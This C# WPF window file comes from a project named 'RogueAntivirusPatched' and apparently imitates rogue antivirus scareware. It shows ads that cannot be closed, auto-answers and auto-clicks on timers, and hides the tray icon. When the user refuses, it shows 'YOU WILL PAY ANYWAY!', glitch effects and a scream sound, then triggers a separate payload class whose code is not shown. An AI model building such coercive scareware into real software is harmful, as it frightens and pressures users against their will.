using RogueAntivirusPatched.Classes;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using controls = System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Controls;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using RogueAntivirusPatched.ViewModel;
using System.Runtime.CompilerServices;
using System.Drawing;
using System.IO;
using static RogueAntivirusPatched.Global.Convertor;
using System.Collections.ObjectModel;
using static RogueAntivirusPatched.Global.Variables;
using static RogueAntivirusPatched.Global.Messages;
using RogueAntivirusPatched.Global;
using System.Windows.Threading;
using RogueAntivirusPatched.View.Windows;
using System.Media;
using media = System.Windows.Media;
using RogueAntivirusPatched.TrialMode.Payloads;

namespace RogueAntivirusPatched.Windows
{
    /// <summary>
    /// Interaction logic for Advertisement.xaml
    /// </summary>
    public partial class Advertisement : Window
    {
        private static vmAdvertisement _vmAdvertisement;
        public Advertisement()
        {
            InitializeComponent();
            _vmAdvertisement = new vmAdvertisement();
            DataContext = _vmAdvertisement;
        }

        public EventHandler b1, b2;
        private bool disableButtonClosing = false;
        private DispatcherTimer timerAutoAnswer;

        public void ShowAdvertisement(
            bool wait = true,
            string description = "", string title = "RogueAntivirus", string bodyText = "",
            string btn_1_text = null, string btn_2_text = null, EventHandler btn_1_event = null, EventHandler btn_2_event = null,
            double width = 800.0, double height = 800.0, Bitmap image = null, UnmanagedMemoryStream sound = null, int imageWidth = 150, int imageHeight = 150,
            Bitmap[] multipleImages = null, bool finalQestion = false, bool autoClick = false)
        {
            disableButtonClosing = finalQestion;

            if (!PayloadsRunning)
            {
                var sounds = new Sounds();
                sounds.PlaySound(sound);
            }

            if (disableButtonClosing)
            {
                PayloadsRunning = true;
                TrayIcon.DisableNotifyIcon();
                timerAutoAnswer = new DispatcherTimer();
                timerAutoAnswer.IsEnabled = false;
                timerAutoAnswer.Interval = TimeSpan.FromSeconds(20);
                timerAutoAnswer.Tick += (s, e) =>
                {
                    btn_2_Click(this, new RoutedEventArgs());
                };
                timerAutoAnswer.Start();
            }

            _vmAdvertisement.TextBody = bodyText;
            _vmAdvertisement.Description = description;
            _vmAdvertisement.TitlePage = title;
            _vmAdvertisement.ContentFirstBtn = btn_1_text;
            _vmAdvertisement.ContentSecondBtn = btn_2_text;
            _vmAdvertisement.ImageSource = ToBitmapImagePNG(image);
            _vmAdvertisement.ImageWidth = imageWidth;
            _vmAdvertisement.ImageHeight = imageHeight;

            if (multipleImages != null)
            {
                if (_vmAdvertisement.MultipleImages.Count > 0)
                    _vmAdvertisement.MultipleImages.Clear();

                foreach (var bitmap in multipleImages)
                {
                    _vmAdvertisement.MultipleImages.Add(ToBitmapImagePNG(bitmap));
                }
            }

            Width = width;
            Height = height;

            b1 = btn_1_event;
            b2 = btn_2_event;

            Show();

            if (autoClick)
            {
                var timerAutoClick = new DispatcherTimer();
                timerAutoClick.IsEnabled = false;
                timerAutoClick.Interval = TimeSpan.FromSeconds(rand.Next(5, 15));
                timerAutoClick.Tick += (s, e) =>
                {
                    btn_1_Click(this, new RoutedEventArgs());
                    timerAutoClick.Stop();
                };
                timerAutoClick.Start();
            }
        }

        private void Animate(bool appear)
        {
            ScaleTransform.ScaleY = appear ? 0 : 1;
            var slide_anim = new DoubleAnimation
            {
                From = ScaleTransform.ScaleY,
                To = appear ? 1 : 0,
                Duration = TimeSpan.FromMilliseconds(500),
                EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseOut }
            };
            ScaleTransform.BeginAnimation(ScaleTransform.ScaleYProperty, slide_anim);
        }

        private void Window_SourceInitialized(object sender, EventArgs e)
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            this.Left = (bounds.Right - bounds.Left - this.Width) / 2.0;
            this.Top = (bounds.Bottom - bounds.Top - this.Height) / 2.0;

            Animate(true);
        }

        private async void btn_1_Click(object sender, RoutedEventArgs e)
        {
            if (disableButtonClosing)
                return;

            Animate(false);
            await Task.Delay(500);

            b1?.Invoke(this, EventArgs.Empty);
            this.Close();
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (disableButtonClosing)
                e.Cancel = true;
        }

        private async void btn_2_Click(object sender, RoutedEventArgs e)
        {
            timerAutoAnswer?.Stop();

            if (disableButtonClosing)
            {
                RejectedOffer();
                return;
            }

            Animate(false);
            await Task.Delay(500);

            b2?.Invoke(this, EventArgs.Empty);
            this.Close();
        }

        private Beats beats;
        private DispatcherTimer rejectTimer, cursedTimer;
        private static readonly Random rand = new Random();
        private static int rejectOfferCounter = 0;
        private ShieldAnimation shieldAnimation;
        private void RejectedOffer()
        {
            btn_1.Visibility = Visibility.Hidden;
            btn_1.IsEnabled = false;
            btn_2.Visibility = Visibility.Hidden;
            btn_2.IsEnabled = false;
            _vmAdvertisement.ImageSource = null;

            rejectTimer = new DispatcherTimer();
            rejectTimer.Interval = TimeSpan.FromSeconds(3);
            rejectTimer.IsEnabled = false;
            rejectTimer.Tick += RejectTimer_Tick;
            rejectTimer.Start();

            beats = new Beats();
            float[] floatArray = { 10f };
            PCMAudio.PCM.WaveForms[] waves = { PCMAudio.PCM.WaveForms.Triangle };
            _= beats.PCMAudio(floatArray, waves, 10000, 1.0, 3);
        }

        private void RejectTimer_Tick(object sender, EventArgs e)
        {
            if (rejectOfferCounter == 5)
            {
                _vmAdvertisement.TitlePage = "alert.notification.emoji[Types.Evil]";
                _vmAdvertisement.Description = "message.you_failed?.Show()";
                _vmAdvertisement.TextBody = "YOU WILL PAY ANYWAY!";
                _vmAdvertisement.ImageSource = ToBitmapImagePNG(Properties.Resources.evil_shield);
                FadeInAnimation(TimeSpan.FromSeconds(1));

                cursedTimer = new DispatcherTimer();
                cursedTimer.Interval = TimeSpan.FromSeconds(10);
                cursedTimer.IsEnabled = false;
                cursedTimer.Tick += CursedTimer_Tick;
                cursedTimer.Start();

                rejectTimer.Stop();
                return;
            }

            _vmAdvertisement.TitlePage = WindowManager.RandomAscii(rand.Next(5, 500));
            _vmAdvertisement.Description = WindowManager.RandomAscii(rand.Next(5, 500));
            _vmAdvertisement.TextBody = WindowManager.RandomAscii(rand.Next(5, 500));

            rejectOfferCounter++;
        }

        private void CursedTimer_Tick(object sender, EventArgs e)
        {
            cursedTimer.Stop();

            _vmAdvertisement.ImageSource = null;

            int imgSize = 400;

            shieldAnimation = new ShieldAnimation();

            shieldAnimation.DefineGridImages(CursedShieldImage,
                imgSize,
                imgSize,
                3, CursedShield);

            var timerAnimation = new DispatcherTimer();
            timerAnimation.IsEnabled = false;
            timerAnimation.Interval = TimeSpan.FromMilliseconds(1);
            timerAnimation.Tick += (s, e2) =>
            {
                var animOption = (ShieldAnimation.GlitchTypes[])Enum.GetValues(typeof(ShieldAnimation.GlitchTypes));
                shieldAnimation.MakeShieldGlitch(animOption[rand.Next(animOption.Length)]);
                _vmAdvertisement.TitlePage = WindowManager.RandomAscii(rand.Next(5, 20));
                _vmAdvertisement.Description = WindowManager.RandomAscii(rand.Next(5, 10));
                _vmAdvertisement.TextBody = WindowManager.RandomAscii(rand.Next(5, 500));
                _vmAdvertisement.BackgroundColor = new SolidColorBrush(rand.Next(2) == 1 ? media.Color.FromRgb(0, 0, 255) : media.Color.FromRgb(255, 255, 255));
            };
            timerAnimation.Start();

            var scream = new SoundPlayer(Properties.Resources.torture);
            scream.Play();

            var stopCursedAnimation = new DispatcherTimer();
            stopCursedAnimation.IsEnabled = false;
            stopCursedAnimation.Interval = TimeSpan.FromSeconds(10);
            stopCursedAnimation.Tick += (s, e2) => 
            { 
                timerAnimation?.Stop(); 
                scream?.Stop();
                stopCursedAnimation.Stop();

                var payloadMain = new PayloadMain();
                payloadMain.JustForTest();

                Hide();
                Close();
            };
            stopCursedAnimation.Start();
        }

        private void FadeInAnimation(TimeSpan timSpan = new TimeSpan())
        {
            var doubleAnim = new DoubleAnimation
            {
                From = 0,
                To = 1.0,
                Duration = timSpan,
                AutoReverse = false
            };

            SingleImage.BeginAnimation(OpacityProperty, doubleAnim);
        }
    }
}
